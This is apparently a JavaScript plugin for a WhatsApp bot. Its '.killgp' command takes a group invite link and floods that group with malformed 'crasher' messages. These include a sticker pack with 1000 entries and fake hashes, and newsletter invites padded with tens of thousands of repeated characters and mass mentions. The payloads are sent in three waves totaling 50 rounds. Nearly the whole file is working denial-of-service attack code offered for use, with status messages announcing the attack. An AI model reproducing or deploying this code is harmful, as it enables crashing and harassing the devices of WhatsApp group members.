function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async (m, { conn, args }) => {
  const botNumber = conn.decodeJid(conn.user.id);
  const sender = m.sender;

  if (sender !== botNumber) {
    return m.reply("⛔ Solo el bot puede usar este comando.");
  }

  if (!args[0] || !args[0].includes("chat.whatsapp.com/")) {
    return m.reply("❌ Debes escribir el link del grupo.\nEjemplo: .killgp https://chat.whatsapp.com/xxxxx");
  }

  const code = args[0].split("chat.whatsapp.com/")[1];
  if (!code) return m.reply("❌ Código de invitación inválido.");

  let target;
  try {
    const res = await conn.groupGetInviteInfo(code);
    target = res.id;
  } catch {
    return m.reply("⚠️ No pude obtener el ID del grupo. Verifica el enlace.");
  }

  // Función 1
  async function killgc(target) {
    let massage = [];
    for (let r = 0; r < 1000; r++) {
      massage.push({
        fileName: "sticker.webp",
        isAnimated: true,
        mimetype: "image/webp"
      });
    }
    const msg = {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "crasher",
            name: "Crash Pack",
            publisher: "Zall",
            stickers: massage,
            fileLength: "999999999",
            fileSha256: "AAA=",
            fileEncSha256: "AAA=",
            mediaKey: "AAA=",
            directPath: "/enc",
            mediaKeyTimestamp: "99999999",
            trayIconFileName: "icon.png",
            thumbnailSha256: "AAA=",
            thumbnailEncSha256: "AAA=",
            thumbnailHeight: 9999,
            thumbnailWidth: 9999,
            imageDataHash: "hash",
            stickerPackSize: 999999,
            stickerPackOrigin: 999999,
            contextInfo: {
              mentionedJid: Array.from({ length: 1000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              participant: target,
              remoteJid: target
            }
          }
        }
      }
    };
    await conn.relayMessage(target, msg, {});
  }

  // Función 2
  async function rusuhgc(target) {
    const msg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "spam@newsletter",
            newsletterName: "Rusuh" + "ꦾ".repeat(10000),
            caption: "@0".repeat(10000),
            inviteExpiration: Date.now() + 1814400000
          }
        }
      }
    };
    await conn.relayMessage(target, msg, {});
  }

  // Función 3
  async function gcampas(target) {
    const msg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "spam2@newsletter",
            newsletterName: "ZALLISKING" + "ꦾ".repeat(10000),
            caption: "@9".repeat(10000),
            inviteExpiration: Date.now() + 1814400000
          }
        }
      }
    };
    await conn.relayMessage(target, msg, {});
  }

  // Función 4
  async function blankgc(target) {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363370611316879@newsletter",
        newsletterName: "👑ZALLIS👑" + "XxX".repeat(3000),
        caption: "ؙ👑ZALLIS👑\n" + "XxX".repeat(3000),
        inviteExpiration: "0"
      }
    };
    await conn.relayMessage(target, msg, {});
  }

  async function enviarAtaques(cantidad) {
    for (let i = 0; i < cantidad; i++) {
      await killgc(target);
      await rusuhgc(target);
      await gcampas(target);
      await blankgc(target);
    }
  }

  m.reply("⏳ Iniciando ataque en 3 fases...");
  await enviarAtaques(20);
  await sleep(10000);
  await enviarAtaques(20);
  await sleep(10000);
  await enviarAtaques(10);
  m.reply("✅ Ataque completado.");
};

handler.command = /^killgp$/i;
handler.owner = false;
export default handler;